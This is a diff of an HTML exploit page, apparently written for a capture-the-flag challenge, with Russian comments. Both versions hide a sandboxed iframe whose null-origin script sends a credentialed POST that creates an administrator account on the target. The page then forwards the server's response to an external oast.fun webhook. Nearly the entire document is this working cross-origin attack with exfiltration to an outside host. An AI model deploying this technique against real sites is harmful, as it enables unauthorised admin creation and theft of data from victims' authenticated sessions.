@@ -1,60 +1,85 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>null origin exploit</title>
+    <meta charset="UTF-8">
+    <title>Null Origin Exploit</title>
 </head>
 <body>
 
-  <iframe id="exp" sandbox="allow-scripts allow-forms" style="display:none"></iframe>
+<iframe id="evil" 
+        sandbox="allow-scripts" 
+        style="width:1px;height:1px;border:none;position:absolute;left:-9999px;">
+</iframe>
 
-  <script>
-    const iframe = document.getElementById('exp');
+<script>
+const iframe = document.getElementById('evil');
 
-    // Важно: используем srcdoc, а не src — тогда Origin будет null
-    const payload = `
-      <script>
-        async function steal() {
-          try {
-            const res = await fetch("https://tasks.goidactf.ru:20431/create_admin", {
-              method: "POST",
-              credentials: "include",
-              headers: {
-                "Content-Type": "application/x-www-form-urlencoded"
-              },
-              body: "new_admin_login=admin_god_666"
-            });
-
-            if (res.ok) {
-              const text = await res.text();
-              // Отправляем себе результат (токен / флаг / "Admin created" / что угодно)
-              parent.postMessage({ success: true, data: text }, "*");
-            } else {
-              parent.postMessage({ success: false, status: res.status }, "*");
-            }
-          } catch(e) {
-            parent.postMessage({ error: e.message }, "*");
-          }
-        }
-
-        // Запускаем сразу после загрузки
-        steal();
-      <\/script>
-    `;
-
-    iframe.srcdoc = payload;
-
-    // Слушаем сообщение от iframe (Origin null → postMessage к parent разрешён)
-    window.addEventListener("message", function(e) {
-      console.log("Received from null-origin iframe:", e.data);
-
-      // Пересылаем себе на webhook
-      fetch("https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun", {
-        method: "POST",
-        mode: "no-cors",
-        body: JSON.stringify(e.data)
-      });
+// Минимальный payload внутри srcdoc — Origin будет null
+const innerHTML = `
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+async function exploit() {
+  try {
+    const resp = await fetch("https://tasks.goidactf.ru:20431/create_admin", {
+      method: "POST",
+      mode: "cors",
+      credentials: "include",
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      body: "new_admin_login=hacker_null_1337"
     });
-  </script>
+
+    let result = "";
+    if (resp.ok) {
+      result = await resp.text();
+    } else {
+      result = "STATUS_" + resp.status;
+    }
+
+    // Эксфильтрация через parent (postMessage работает с null → parent)
+    parent.postMessage({
+      type: "result",
+      data: result,
+      url: window.location.href,
+      status: resp.status
+    }, "*");
+
+  } catch (err) {
+    parent.postMessage({
+      type: "error",
+      message: err.message || "Unknown error"
+    }, "*");
+  }
+}
+
+exploit();
+<\/script>
+</body>
+</html>
+`;
+
+iframe.srcdoc = innerHTML;
+
+// Ловим сообщение от iframe
+window.addEventListener("message", (event) => {
+  // Можно добавить проверку event.origin === "" или null, но в практике часто просто *
+  console.log("From iframe:", event.data);
+
+  // Отправляем всё себе на webhook (mode: no-cors чтобы не словить CORS на webhook)
+  fetch("https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun", {
+    method: "POST",
+    mode: "no-cors",
+    keepalive: true,
+    body: JSON.stringify(event.data)
+  });
+});
+</script>
+
+<!-- Для дебага: просто видимый текст, чтобы понять, что страница загрузилась -->
+<h1>Waiting for bot...</h1>
 
 </body>
 </html>
